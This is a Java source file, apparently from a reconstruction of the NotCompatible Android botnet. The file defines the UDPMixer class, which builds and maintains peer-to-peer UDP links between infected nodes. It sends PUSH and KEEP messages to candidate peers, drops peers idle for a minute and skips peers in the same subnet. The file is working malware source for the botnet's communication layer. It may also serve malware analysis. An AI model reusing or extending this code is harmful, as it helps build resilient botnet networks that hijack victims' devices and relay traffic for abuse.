package diff.notcompatible.c.bot.net.udp;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.util.logging.Logger;

import diff.notcompatible.c.bot.net.ThreadServer;
import diff.notcompatible.c.bot.net.udp.objects.UDPPointList;
import diff.notcompatible.c.bot.net.udp.objects.UDPRemPointListItem;

public class UDPMixer extends UDPSocket {

    private final static Logger LOGGER = Logger.getLogger("session");

    public UDPPointList list;
    public ThreadServer owner;

    public UDPMixer(ThreadServer newOwner) {
        super(newOwner.nio.selector);
        list = new UDPPointList(this);
        owner = newOwner;
    }

    public void check() {
        long currentTime = System.currentTimeMillis();
        for (int i = 0; i < count(); i++) {
            UDPPoint udpPoint = list.getByIndex(i);
            if ((udpPoint.lastChangeTime + 60000) < currentTime) { // ||
                                                                   // udpPoint.endPoint.getAddress().getHostAddress().equals(owner.ip))
                                                                   // {
                udpPoint.doDelete(udpPoint.isEncrypt);
            } else {
                udpPoint.check();
            }
        }
    }

    public void createU2ULink() {
        for (int i = 0; i < count(); i++) {
            UDPPoint udpPoint = list.getByIndex(i);
            UDPRemPointListItem rplItem = udpPoint.remlist.getCandidate();
            if ((rplItem != null) && (list.getByInetSocketAddress(rplItem.addr) != null)) {
                udpPoint.sendPUSH(rplItem.addr.getAddress().getHostAddress(), rplItem.addr.getPort());
                rplItem.status = 1;
                UDPPoint upLink = createLink(rplItem.addr.getAddress().getHostAddress(), rplItem.addr.getPort());
                upLink.lastChangeTime = System.currentTimeMillis() + 30000;
                upLink.keepByte = (byte) 0x03;
                upLink.sendKEEP();
            }
        }
    }

    public UDPPoint createLink(String ip, int port) {
        UDPPoint upLink = null;
        InetSocketAddress epAddr = new InetSocketAddress(ip, port);

        if ((list.getByInetSocketAddress(epAddr) == null) && !checkSubnet(ip)) {
            upLink = new UDPPoint(this);
            upLink.endPoint = epAddr;
            upLink.lastChangeTime = System.currentTimeMillis();
            list.add(upLink);
        }

        return upLink;
    }

    public int count() {
        return list.count();
    }

    public int getConnections() {
        int connections = 0;

        for (int i = 0; i < count(); i++) {
            if (list.getByIndex(i).isEncrypt) {
                connections++;
            }
        }

        return connections;
    }

    public int getCandidates() {
        return list.getCandidates();
    }

    // Check if ip address same subnet as any P2PLinks
    public boolean checkSubnet(String ipToCheck) {
        byte[] ip = ip2byte(ipToCheck);

        for (int i = 0; i < count(); i++) {
            byte[] ip2 = list.getByIndex(i).endPoint.getAddress().getAddress();
            if ((ip[0] == ip2[0]) && (ip[1] == ip2[1]) && (ip[2] == ip2[2])) {
                return true;
            }
        }

        return false;
    }

    public static byte[] ip2byte(String IP) {
        byte[] b = new byte[4];

        String[] x = IP.split("\\.", 4);
        b[0] = (byte) (Integer.parseInt(x[0]) & 0xFF);
        b[1] = (byte) (Integer.parseInt(x[1]) & 0xFF);
        b[2] = (byte) (Integer.parseInt(x[2]) & 0xFF);
        b[3] = (byte) (Integer.parseInt(x[3]) & 0xFF);

        return b;
    }

    @Override
    public void onRead(SelectionKey key) throws IOException {
        super.onRead(key);
        try {
            ByteBuffer dataBuffer = ByteBuffer.allocate(8192);
            dataBuffer.clear();
            InetSocketAddress socketAddress = (InetSocketAddress) channel.receive(dataBuffer);
            byte[] dataArray = new byte[dataBuffer.position()];
            System.arraycopy(dataBuffer.array(), 0, dataArray, 0, dataBuffer.position());
            UDPPoint up = list.getByInetSocketAddress(socketAddress);
            if (up == null) {
                up = new UDPPoint(this);
                up.endPoint = socketAddress;
                list.add(up);
            }
            up.onRecv(dataArray);
        } catch (Exception exception) {
            LOGGER.throwing(exception.getClass().getName(), "onRead()", exception);
            exception.printStackTrace();
        }
    }
}
